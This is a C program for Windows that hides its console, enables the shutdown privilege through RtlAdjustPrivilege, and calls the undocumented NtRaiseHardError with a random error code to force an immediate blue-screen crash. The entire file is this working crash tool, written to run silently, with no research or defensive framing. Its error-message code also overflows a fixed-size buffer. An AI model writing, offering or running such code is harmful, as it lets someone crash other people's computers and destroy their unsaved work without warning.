#include <stdio.h>
#include <time.h>
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>

// Declaration of RtlAdjustPrivilege and NtRaiseHardError
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);

int main()
{
    // Hide console
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Set current process priority class to highest available
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    
    // For error handling
    NTSTATUS error_ret = NULL;

    // Load ntdll.dll to current process
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll == NULL)
    {
        error_ret = STATUS_DLL_INIT_FAILED;
        goto jmp_exit;
    }

    // Import address of RtlAdjustPrivilege and NtRaiseHardError
    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
    if (RtlAdjustPrivilege == NULL || NtRaiseHardError == NULL)
    {
        error_ret = STATUS_INVALID_ADDRESS;
        goto jmp_exit;
    }

    // Activate shutdown privilege
    BOOLEAN bEnabled;
    NTSTATUS shutdown_priv = RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
    if (!NT_SUCCESS(shutdown_priv))
    {
        error_ret = shutdown_priv;
        goto jmp_exit;
    }

    // Push bsod
    srand((UINT32)time(NULL));
    ULONG uResp;
    NTSTATUS bsod = NtRaiseHardError((NTSTATUS)(0xC0000000 | ((rand() % 10) << 8) | ((rand() % 16) << 4) | rand() % 16), NULL, NULL, NULL, 6, &uResp);
    if (!NT_SUCCESS(bsod))
    {
        error_ret = bsod;
        goto jmp_exit;
    }

    // Cleanup
    jmp_exit:
    if (error_ret != STATUS_DLL_INIT_FAILED || ntdll != NULL)
    {
        FreeLibrary(ntdll);
    }
    if (error_ret != NULL)
    {
        WCHAR msg[] = L"0x%08lX";
        swprintf(msg, _scwprintf(msg, error_ret) + 1, msg, error_ret);
        MessageBoxW(NULL, msg, L"Returned", MB_OK | MB_ICONEXCLAMATION | MB_SYSTEMMODAL);
    }
    return (int)error_ret;
}
